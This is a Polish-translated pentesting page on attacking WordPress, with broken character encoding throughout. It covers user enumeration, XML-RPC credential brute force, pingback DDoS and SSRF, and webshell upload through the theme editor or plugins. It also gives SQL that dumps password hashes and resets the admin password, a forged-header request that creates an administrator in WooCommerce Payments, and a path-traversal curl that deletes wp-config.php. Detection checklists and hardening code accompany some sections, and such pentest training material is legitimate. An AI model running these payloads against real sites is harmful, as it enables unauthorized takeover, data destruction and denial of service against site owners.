# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

- **Uploaded** pliki trafiajÄ… do: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Pliki motywÃ³w znajdujÄ… siÄ™ w /wp-content/themes/,** wiÄ™c jeÅ›li zmienisz jakiÅ› plik php motywu, aby uzyskaÄ‡ RCE, prawdopodobnie uÅ¼yjesz tej Å›cieÅ¼ki. Na przykÅ‚ad: uÅ¼ywajÄ…c **theme twentytwelve** moÅ¼esz **uzyskaÄ‡ dostÄ™p** do pliku **404.php** w: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- W **wp-config.php** moÅ¼esz znaleÅºÄ‡ hasÅ‚o roota bazy danych.
- DomyÅ›lne Å›cieÅ¼ki logowania do sprawdzenia: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` zawiera przydatne informacje, takie jak zainstalowana wersja WordPressa.
- `wp-activate.php` jest uÅ¼ywany w procesie aktywacji przez e-mail podczas zakÅ‚adania nowej witryny WordPress.
- Foldery logowania (mogÄ… byÄ‡ przemianowane, aby je ukryÄ‡):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` to plik reprezentujÄ…cy funkcjÄ™ WordPress, ktÃ³ra umoÅ¼liwia przesyÅ‚anie danych przy uÅ¼yciu HTTP jako mechanizmu transportu i XML jako mechanizmu kodowania. Ten sposÃ³b komunikacji zostaÅ‚ zastÄ…piony przez WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folder `wp-content` jest gÅ‚Ã³wnym katalogiem, w ktÃ³rym przechowywane sÄ… wtyczki i motywy.
- `wp-content/uploads/` to katalog, w ktÃ³rym przechowywane sÄ… wszystkie pliki przesÅ‚ane do platformy.
- `wp-includes/` to katalog, w ktÃ³rym znajdujÄ… siÄ™ pliki rdzenia, takie jak certyfikaty, czcionki, pliki JavaScript i widgety.
- `wp-sitemap.xml` W wersjach WordPress 5.5 i nowszych, WordPress generuje plik mapy witryny XML zawierajÄ…cy wszystkie publiczne wpisy oraz publicznie zapytalne typy wpisÃ³w i taksonomie.

**Post exploitation**

- Plik `wp-config.php` zawiera informacje wymagane przez WordPress do poÅ‚Ä…czenia z bazÄ… danych, takie jak nazwa bazy danych, host bazy danych, nazwa uÅ¼ytkownika i hasÅ‚o, klucze uwierzytelniania i salta oraz prefiks tabel bazy danych. Ten plik konfiguracyjny moÅ¼e byÄ‡ rÃ³wnieÅ¼ uÅ¼yty do wÅ‚Ä…czenia trybu DEBUG, co moÅ¼e byÄ‡ przydatne przy rozwiÄ…zywaniu problemÃ³w.

### Uprawnienia uÅ¼ytkownikÃ³w

- **Administrator**
- **Editor**: Publikuje i zarzÄ…dza swoimi oraz cudzymi wpisami
- **Author**: Publikuje i zarzÄ…dza wÅ‚asnymi wpisami
- **Contributor**: Pisze i zarzÄ…dza swoimi wpisami, ale nie moÅ¼e ich publikowaÄ‡
- **Subscriber**: PrzeglÄ…da wpisy i edytuje swÃ³j profil

## **Passive Enumeration**

### **Sprawdzenie wersji WordPressa**

SprawdÅº, czy moÅ¼esz znaleÅºÄ‡ pliki `/license.txt` lub `/readme.html`

W **kodzie ÅºrÃ³dÅ‚owym** strony (przykÅ‚ad z [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Pliki linkÃ³w CSS

![](<../../images/image (533).png>)

- Pliki JavaScript

![](<../../images/image (524).png>)

### Pobierz wtyczki
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Pobierz motywy
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### WyodrÄ™bnianie wersji â€” ogÃ³lnie
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktywna enumeracja

### Wtyczki i motywy

Prawdopodobnie nie bÄ™dziesz w stanie znaleÅºÄ‡ wszystkich moÅ¼liwych wtyczek i motywÃ³w. Aby odkryÄ‡ wszystkie, bÄ™dziesz musiaÅ‚ **aktywnie Brute Force listÄ™ wtyczek i motywÃ³w** (miejmy nadziejÄ™, Å¼e istniejÄ… automatyczne narzÄ™dzia, ktÃ³re zawierajÄ… te listy).

### UÅ¼ytkownicy

- **ID Brute:** Otrzymujesz prawidÅ‚owych uÅ¼ytkownikÃ³w z serwisu WordPress przez Brute Forcing ID uÅ¼ytkownikÃ³w:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
JeÅ›li odpowiedzi majÄ… status **200** lub **30X**, oznacza to, Å¼e id jest **prawidÅ‚owe**. JeÅ›li odpowiedÅº to **400**, wtedy id jest **nieprawidÅ‚owe**.

- **wp-json:** MoÅ¼esz takÅ¼e sprÃ³bowaÄ‡ uzyskaÄ‡ informacje o uÅ¼ytkownikach, zapytujÄ…c:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Inny endpoint `/wp-json/`, ktÃ³ry moÅ¼e ujawniÄ‡ pewne informacje o uÅ¼ytkownikach, to:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ZwrÃ³Ä‡ uwagÄ™, Å¼e ten endpoint ujawnia tylko uÅ¼ytkownikÃ³w, ktÃ³rzy opublikowali post. **Dostarczone zostanÄ… tylko informacje o uÅ¼ytkownikach, ktÃ³rzy majÄ… tÄ™ funkcjÄ™ wÅ‚Ä…czonÄ…**.

ZauwaÅ¼ takÅ¼e, Å¼e **/wp-json/wp/v2/pages** moÅ¼e prowadziÄ‡ do leak adresÃ³w IP.

- **Login username enumeration**: Podczas logowania siÄ™ przez **`/wp-login.php`** komunikat (**message**) jest **inny** w zaleÅ¼noÅ›ci od tego, czy wskazany **username** istnieje, czy nie.

### XML-RPC

JeÅ›li `xml-rpc.php` jest aktywne, moÅ¼esz wykonaÄ‡ credentials brute-force lub uÅ¼yÄ‡ go do uruchamiania DoS atakÃ³w na inne zasoby. (MoÅ¼esz zautomatyzowaÄ‡ ten proces[ using this](https://github.com/relarizky/wpxploit) na przykÅ‚ad).

Aby sprawdziÄ‡, czy jest aktywny, sprÃ³buj uzyskaÄ‡ dostÄ™p do _**/xmlrpc.php**_ i wyÅ›lij takie Å¼Ä…danie:

**SprawdÅº**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** lub **`metaWeblog.getUsersBlogs`** sÄ… niektÃ³rymi metodami, ktÃ³re moÅ¼na wykorzystaÄ‡ do brute-force credentials. JeÅ›li znajdziesz ktÃ³rÄ…kolwiek z nich, moÅ¼esz wysÅ‚aÄ‡ coÅ› takiego:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Komunikat _"Incorrect username or password"_ w odpowiedzi z kodem 200 powinien pojawiÄ‡ siÄ™, jeÅ›li poÅ›wiadczenia nie sÄ… poprawne.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

UÅ¼ywajÄ…c poprawnych poÅ›wiadczeÅ„ moÅ¼esz przesÅ‚aÄ‡ plik. W odpowiedzi pojawi siÄ™ Å›cieÅ¼ka ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Omijanie 2FA**

Metoda ta jest przeznaczona dla programÃ³w, nie dla ludzi, i jest stara, dlatego nie obsÅ‚uguje 2FA. WiÄ™c jeÅ›li masz waÅ¼ne creds, ale gÅ‚Ã³wne logowanie jest chronione 2FA, **moÅ¼esz byÄ‡ w stanie naduÅ¼yÄ‡ xmlrpc.php, aby zalogowaÄ‡ siÄ™ tymi creds omijajÄ…c 2FA**. ZauwaÅ¼, Å¼e nie bÄ™dziesz w stanie wykonaÄ‡ wszystkich akcji, ktÃ³re moÅ¼esz wykonaÄ‡ przez konsolÄ™, ale nadal moÅ¼esz uzyskaÄ‡ RCE, jak wyjaÅ›nia Ippsec w [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** przeprowadziÄ‡ skanowanie jakiejÅ› wewnÄ™trznej **sieci** (moÅ¼esz wskazaÄ‡ dowolny port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

JeÅ›li otrzymasz **faultCode** o wartoÅ›ci **wiÄ™kszej** niÅ¼ **0** (17), oznacza to, Å¼e port jest otwarty.

Zobacz uÅ¼ycie **`system.multicall`** w poprzedniej sekcji, aby dowiedzieÄ‡ siÄ™, jak naduÅ¼yÄ‡ tej metody, by spowodowaÄ‡ DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ten plik zwykle znajduje siÄ™ w katalogu gÅ‚Ã³wnym strony WordPress: **`/wp-cron.php`**\
Po **uzyskaniu dostÄ™pu** do tego pliku wykonywane jest "**ciÄ™Å¼kie**" zapytanie MySQL (**query**), wiÄ™c moÅ¼e byÄ‡ uÅ¼yty przez **atakujÄ…cych** do **spowodowania** **DoS**.\
Ponadto, domyÅ›lnie `wp-cron.php` jest wywoÅ‚ywany przy kaÅ¼dym Å‚adowaniu strony (za kaÅ¼dym razem, gdy klient Å¼Ä…da dowolnej strony WordPress), co na stronach o duÅ¼ym ruchu moÅ¼e powodowaÄ‡ problemy (DoS).

Zaleca siÄ™ wyÅ‚Ä…czenie Wp-Cron i utworzenie rzeczywistego cronjob na hoÅ›cie, ktÃ³ry bÄ™dzie wykonywaÅ‚ potrzebne akcje w regularnych odstÄ™pach (bez powodowania problemÃ³w).

### /wp-json/oembed/1.0/proxy - SSRF

SprÃ³buj uzyskaÄ‡ dostÄ™p do _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ a strona Worpress moÅ¼e wykonaÄ‡ Å¼Ä…danie do Ciebie.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

To narzÄ™dzie sprawdza, czy istnieje **methodName: pingback.ping** oraz Å›cieÅ¼ka **/wp-json/oembed/1.0/proxy**, i jeÅ›li tak, prÃ³buje je wykorzystaÄ‡.

## Automatyczne narzÄ™dzia
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Uzyskaj dostÄ™p przez nadpisanie jednego bitu

To bardziej ciekawostka niÅ¼ prawdziwy atak. W CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) moÅ¼na byÅ‚o przeÅ‚Ä…czyÄ‡ 1 bit w dowolnym pliku wordpress. MoÅ¼na byÅ‚o wiÄ™c zmieniÄ‡ bit na pozycji `5389` w pliku `/var/www/html/wp-includes/user.php`, aby zamieniÄ‡ operacjÄ™ NOT (`!`) na NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modyfikacja pliku php w uÅ¼ywanym motywie (wymagane dane logowania administratora)**

Appearance â†’ Theme Editor â†’ 404 Template (at the right)

ZmieÅ„ zawartoÅ›Ä‡ na php shell:

![](<../../images/image (384).png>)

Wyszukaj w internecie, jak uzyskaÄ‡ dostÄ™p do zaktualizowanej strony. W tym przypadku musisz wejÅ›Ä‡ tutaj: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¼esz uÅ¼yÄ‡:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
aby uzyskaÄ‡ sesjÄ™.

## Plugin RCE

### PHP plugin

MoÅ¼e byÄ‡ moÅ¼liwe przesÅ‚anie plikÃ³w .php jako plugin.\
UtwÃ³rz swÃ³j php backdoor na przykÅ‚ad uÅ¼ywajÄ…c:

![](<../../images/image (183).png>)

NastÄ™pnie dodaj nowy plugin:

![](<../../images/image (722).png>)

Wgraj plugin i naciÅ›nij Install Now:

![](<../../images/image (249).png>)

Kliknij na Procced:

![](<../../images/image (70).png>)

Prawdopodobnie nic siÄ™ pozornie nie stanie, ale jeÅ›li przejdziesz do Media, zobaczysz przesÅ‚any shell:

![](<../../images/image (462).png>)

OtwÃ³rz go â€” zobaczysz URL do wykonania reverse shell:

![](<../../images/image (1006).png>)

### Wgrywanie i aktywacja zÅ‚oÅ›liwego pluginu

Ta metoda polega na instalacji zÅ‚oÅ›liwego pluginu znanego z podatnoÅ›ci, ktÃ³ry moÅ¼e zostaÄ‡ wykorzystany do uzyskania web shell. Proces przebiega przez WordPress dashboard w nastÄ™pujÄ…cy sposÃ³b:

1. **Plugin Acquisition**: Plugin jest pobierany ze ÅºrÃ³dÅ‚a takiego jak Exploit DB, np. [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- PrzejdÅº do WordPress dashboard, nastÄ™pnie do `Dashboard > Plugins > Upload Plugin`.
- Wgraj plik zip pobranego pluginu.
3. **Plugin Activation**: Po pomyÅ›lnej instalacji plugin musi zostaÄ‡ aktywowany z poziomu dashboardu.
4. **Exploitation**:
- Ze zainstalowanym i aktywowanym pluginem "reflex-gallery" moÅ¼na go wykorzystaÄ‡, poniewaÅ¼ jest znany z podatnoÅ›ci.
- Metasploit framework dostarcza exploit dla tej podatnoÅ›ci. ÅadujÄ…c odpowiedni moduÅ‚ i wykonujÄ…c konkretne polecenia moÅ¼na uzyskaÄ‡ sesjÄ™ meterpreter, co daje nieautoryzowany dostÄ™p do serwisu.
- NaleÅ¼y pamiÄ™taÄ‡, Å¼e to tylko jedna z wielu metod wykorzystania WordPressa.

TreÅ›Ä‡ zawiera ilustracje pokazujÄ…ce kroki w WordPress dashboard podczas instalacji i aktywacji pluginu. Jednak waÅ¼ne jest, aby pamiÄ™taÄ‡, Å¼e wykorzystywanie luk w ten sposÃ³b jest nielegalne i nieetyczne bez odpowiedniej autoryzacji. Informacje te powinny byÄ‡ uÅ¼ywane odpowiedzialnie i tylko w kontekÅ›cie prawnym, takim jak penetration testing z wyraÅºnÄ… zgodÄ….

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## Z XSS do RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Creates an user in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Upload your custom plugin (backdoor) to WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edit a Built-In Plugins in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edit a Built-In Themes in WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits for Third-Party WordPress Plugins/Themes.

## Post Exploitation

WyodrÄ™bnij nazwy uÅ¼ytkownikÃ³w i hasÅ‚a:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ZmieÅ„ hasÅ‚o administratora:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Wtyczki Pentest

### Powierzchnia ataku

ZnajomoÅ›Ä‡ sposobÃ³w, w jaki wtyczka Wordpress moÅ¼e ujawniÄ‡ funkcjonalnoÅ›Ä‡, jest kluczowa do znalezienia luk w tej funkcjonalnoÅ›ci. MoÅ¼esz znaleÅºÄ‡, w jaki sposÃ³b wtyczka moÅ¼e ujawniaÄ‡ funkcjonalnoÅ›Ä‡, w poniÅ¼szych punktach oraz kilka przykÅ‚adÃ³w podatnych wtyczek w [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jednym ze sposobÃ³w, w jaki wtyczka moÅ¼e udostÄ™pniÄ‡ funkcje uÅ¼ytkownikom, sÄ… handlery AJAX. MogÄ… one zawieraÄ‡ bÅ‚Ä™dy w logice, autoryzacji lub uwierzytelnianiu. Co wiÄ™cej, doÅ›Ä‡ czÄ™sto te funkcje opierajÄ… zarÃ³wno uwierzytelnianie, jak i autoryzacjÄ™ na istnieniu wordpress nonce, ktÃ³ry **kaÅ¼dy uwierzytelniony uÅ¼ytkownik w instancji Wordpress moÅ¼e posiadaÄ‡** (niezaleÅ¼nie od roli).

Oto funkcje, ktÃ³re mogÄ… byÄ‡ uÅ¼yte do udostÄ™pnienia funkcji w wtyczce:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**UÅ¼ycie `nopriv` sprawia, Å¼e endpoint jest dostÄ™pny dla dowolnych uÅ¼ytkownikÃ³w (nawet niezalogowanych).**

> [!CAUTION]
> Ponadto, jeÅ¼eli funkcja tylko sprawdza autoryzacjÄ™ uÅ¼ytkownika za pomocÄ… funkcji `wp_verify_nonce`, ta funkcja jedynie sprawdza, czy uÅ¼ytkownik jest zalogowany â€” zazwyczaj nie weryfikuje roli uÅ¼ytkownika. W zwiÄ…zku z tym uÅ¼ytkownicy o niskich uprawnieniach mogÄ… mieÄ‡ dostÄ™p do akcji o wysokich uprawnieniach.

- **REST API**

It's also possible to expose functions from wordpress registering a rest AP using the `register_rest_route` function:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` to callback do funkcji, ktÃ³ra sprawdza, czy dany uÅ¼ytkownik jest uprawniony do wywoÅ‚ania metody API.

**JeÅ¼eli uÅ¼yta zostanie wbudowana funkcja `__return_true`, po prostu pominie ona sprawdzenie uprawnieÅ„ uÅ¼ytkownika.**

- **BezpoÅ›redni dostÄ™p do pliku php**

OczywiÅ›cie Wordpress uÅ¼ywa PHP, a pliki w ramach pluginÃ³w sÄ… bezpoÅ›rednio dostÄ™pne z sieci. JeÅ›li wtyczka ujawnia jakÄ…Å› podatnÄ… funkcjonalnoÅ›Ä‡, ktÃ³ra jest uruchamiana po samym dostÄ™pie do pliku, bÄ™dzie ona wykorzystywalna przez dowolnego uÅ¼ytkownika.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

NiektÃ³re wtyczki implementujÄ… skrÃ³ty â€trusted headerâ€ dla integracji wewnÄ™trznych lub reverse proxy, a nastÄ™pnie uÅ¼ywajÄ… tego nagÅ‚Ã³wka do ustawienia kontekstu aktualnego uÅ¼ytkownika dla Å¼Ä…daÅ„ REST. JeÅ›li nagÅ‚Ã³wek nie jest kryptograficznie powiÄ…zany z Å¼Ä…daniem przez komponent nadrzÄ™dny, atakujÄ…cy moÅ¼e go sfaÅ‚szowaÄ‡ i wywoÅ‚aÄ‡ uprzywilejowane trasy REST jako administrator.

- Skutek: eskalacja uprawnieÅ„ bez uwierzytelnienia do administratora poprzez utworzenie nowego konta administratora za pomocÄ… podstawowej trasy REST users.
- PrzykÅ‚adowy nagÅ‚Ã³wek: `X-Wcpay-Platform-Checkout-User: 1` (wymusza ID uÅ¼ytkownika 1, zwykle pierwsze konto administratora).
- Wykorzystywana trasa: `POST /wp-json/wp/v2/users` z tablicÄ… zawierajÄ…cÄ… rolÄ™ o podwyÅ¼szonych uprawnieniach.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Dlaczego to dziaÅ‚a

- Wtyczka mapuje nagÅ‚Ã³wek kontrolowany przez klienta na stan uwierzytelnienia i pomija sprawdzenia uprawnieÅ„.
- RdzeÅ„ WordPress oczekuje uprawnienia `create_users` dla tej Å›cieÅ¼ki; wtyczka omija to poprzez bezpoÅ›rednie ustawienie kontekstu bieÅ¼Ä…cego uÅ¼ytkownika z nagÅ‚Ã³wka.

Oczekiwane wskaÅºniki sukcesu

- HTTP 201 z ciaÅ‚em JSON opisujÄ…cym utworzonego uÅ¼ytkownika.
- Nowe konto administratora widoczne w `wp-admin/users.php`.

Lista kontrolna wykrywania

- Przeszukaj (grep) `getallheaders()`, `$_SERVER['HTTP_...']`, lub vendor SDKs ktÃ³re odczytujÄ… niestandardowe nagÅ‚Ã³wki, aby ustawiÄ‡ kontekst uÅ¼ytkownika (np. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Przejrzyj rejestracje REST pod kÄ…tem uprzywilejowanych callbackÃ³w, ktÃ³re nie majÄ… solidnych sprawdzeÅ„ `permission_callback` i zamiast tego polegajÄ… na nagÅ‚Ã³wkach Å¼Ä…dania.
- Szukaj uÅ¼yÄ‡ funkcji zarzÄ…dzania uÅ¼ytkownikami rdzenia (`wp_insert_user`, `wp_create_user`) wewnÄ…trz handlerÃ³w REST, ktÃ³re sÄ… zabezpieczone jedynie wartoÅ›ciami nagÅ‚Ã³wkÃ³w.

Wzmocnienie

- Nigdy nie wyprowadzaj uwierzytelnienia ani autoryzacji z nagÅ‚Ã³wkÃ³w kontrolowanych przez klienta.
- JeÅ›li reverse proxy musi wstrzyknÄ…Ä‡ toÅ¼samoÅ›Ä‡, zakoÅ„cz zaufanie przy proxy i usuÅ„ przychodzÄ…ce kopie (np. `unset X-Wcpay-Platform-Checkout-User` na krawÄ™dzi), nastÄ™pnie przekaÅ¼ podpisany token i zweryfikuj go po stronie serwera.
- Dla REST routes wykonujÄ…cych uprzywilejowane akcje wymagaj sprawdzeÅ„ `current_user_can()` i rygorystycznego `permission_callback` (NIE uÅ¼ywaj `__return_true`).
- Preferuj autentykacjÄ™ pierwszej strony (cookies, application passwords, OAuth) zamiast nagÅ‚Ã³wkowego â€podszywania siÄ™â€.

Referencje: zobacz linki na koÅ„cu tej strony dotyczÄ…ce publicznego przypadku i szerszej analizy.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Unauthenticated access** â€“ the `wp_ajax_nopriv_` hook is registered.
* **No nonce / capability check** â€“ any visitor can hit the endpoint.
* **No path sanitisation** â€“ the userâ€“controlled `fontfamily` string is concatenated to a filesystem path without filtering, allowing classic `../../` traversal.

#### Wykorzystanie

AtakujÄ…cy moÅ¼e usunÄ…Ä‡ dowolny plik lub katalog **poniÅ¼ej katalogu bazowego uploads** (normally `<wp-root>/wp-content/uploads/`) by sending a single HTTP POST request:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
PoniewaÅ¼ `wp-config.php` znajduje siÄ™ poza *uploads*, cztery sekwencje `../` wystarczÄ… na domyÅ›lnej instalacji. UsuniÄ™cie `wp-config.php` zmusza WordPress do uruchomienia *kreatora instalacji* przy nastÄ™pnej wizycie, umoÅ¼liwiajÄ…c caÅ‚kowite przejÄ™cie strony (atakujÄ…cy jedynie dostarcza nowÄ… konfiguracjÄ™ bazy danych i tworzy konto administratora).

Inne istotne cele to pliki `.php` wtyczek/motywÃ³w (aby uszkodziÄ‡ wtyczki zabezpieczajÄ…ce) lub reguÅ‚y `.htaccess`.

#### Lista kontrolna wykrywania

* KaÅ¼dy callback `add_action( 'wp_ajax_nopriv_...')` ktÃ³ry wywoÅ‚uje helpery systemu plikÃ³w (`copy()`, `unlink()`, `$wp_filesystem->delete()`, itd.).
* ÅÄ…czenie niesanitizowanych danych wejÅ›ciowych uÅ¼ytkownika w Å›cieÅ¼kach (szukaj `$_POST`, `$_GET`, `$_REQUEST`).
* Brak `check_ajax_referer()` oraz `current_user_can()`/`is_user_logged_in()`.

#### Wzmocnienie
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Zawsze** traktuj kaÅ¼dÄ… operacjÄ™ zapisu/usuniÄ™cia na dysku jako uprzywilejowanÄ… i podwÃ³jnie sprawdÅº:
> â€¢ Authentication  â€¢ Authorisation  â€¢ Nonce  â€¢ Input sanitisation  â€¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Wiele wtyczek implementuje funkcjÄ™ "view as role" lub tymczasowej zmiany roli, zapisujÄ…c oryginalne role w user meta, aby moÅ¼na je byÅ‚o pÃ³Åºniej przywrÃ³ciÄ‡. JeÅ›li Å›cieÅ¼ka przywracania opiera siÄ™ tylko na parametrach Å¼Ä…dania (np. `$_REQUEST['reset-for']`) i liÅ›cie utrzymywanej przez wtyczkÄ™ bez sprawdzenia capabilities i waÅ¼nego nonce, staje siÄ™ to vertical privilege escalation.

